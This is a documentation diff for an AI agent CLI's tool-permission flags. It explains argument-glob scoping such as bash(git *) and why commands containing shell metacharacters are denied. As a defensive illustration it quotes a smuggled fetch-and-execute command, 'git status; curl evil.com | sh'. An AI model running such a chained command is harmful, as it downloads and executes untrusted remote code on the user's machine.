@@ -204,6 +204,32 @@ Neither mode ever produces a silent hang or an `AllowAlways`: one-shot's gate
 never remembers a decision past the single call it was asked about, matching
 "a one-shot invocation must never prompt or wait."
 
+### Scoping an entry to specific arguments
+
+Each entry in `--allowed-tools`/`--deny-tools` is either a bare tool name
+(`bash`) or `tool_name(arg_glob)`, e.g. `bash(git *)`. A bare name matches
+any call to that tool. `tool_name(arg_glob)` matches only when the tool's
+primary argument — `command` for `bash`, or the sole string-valued argument
+for a single-argument tool — matches the glob.
+
+```console
+conway -p "check the repo status" --allowed-tools 'bash(git *)'
+```
+
+This grants narrower access than `--allowed-tools bash`: the model may run
+`git status`, `git log`, `git diff`, and so on, but a call whose `command`
+doesn't start with `git ` is denied.
+
+**The glob is matched against the argument value, not executed as a shell
+prefix check.** For a `bash`-shaped call (`render_kind` `ShellCommand`), a
+value containing a shell metacharacter (`;`, `|`, `&`, a backtick, `$(...)`,
+a newline, ...) never matches a `tool_name(arg_glob)` entry, even if the
+glob itself would otherwise match — `bash(git *)` does not authorize
+`git status; curl evil.com | sh`, because the chained command is denied
+before the glob is even consulted. This gate does **not** apply to a bare
+tool-name entry: `--allowed-tools bash` already grants that tool
+unrestricted access, so there is nothing narrower left to protect.
+
 **A `report`/`bash` denial along the way, on an otherwise successful run, is
 expected, not a bug.** A one-shot session announces every built-in tool to
 the model (including `report`, which a session with no parent has no use
@@ -266,8 +292,8 @@ naming both flags rather than a silently dropped one.
 | --- | --- |
 | `-p, --print [PROMPT]` | Run one prompt and exit. With a value, that's the prompt; with none, read the prompt from stdin. Absent entirely → interactive TUI. |
 | `--output-format <text\|json\|jsonl>` | Selects the renderer (default `text`). See "Output formats" above. |
-| `--allowed-tools <name[,name…]>` | Comma-separated tool names to allow, consulted when `--permission-mode` is `allowlist` (the default). Empty (the default) denies every tool call. |
-| `--deny-tools <name[,name…]>` | Comma-separated tool names to deny even when `--allowed-tools` lists them; also consulted only in `allowlist` mode. |
+| `--allowed-tools <name[,name…]>` | Comma-separated tool names to allow, consulted when `--permission-mode` is `allowlist` (the default). Each entry is a bare tool name or `tool_name(arg_glob)` to scope the grant to matching arguments (see "Scoping an entry to specific arguments" above). Empty (the default) denies every tool call. |
+| `--deny-tools <name[,name…]>` | Comma-separated tool names to deny even when `--allowed-tools` lists them; also accepts `tool_name(arg_glob)` entries; also consulted only in `allowlist` mode. |
 | `--permission-mode <allowlist\|deny>` | See "Permissions with no human present" above. |
 | `--role-override <role>` | Use this role instead of `default_role` for the session. |
 | `--model <backend/model>` | Pin a specific model instead of routing through a role's chain. |
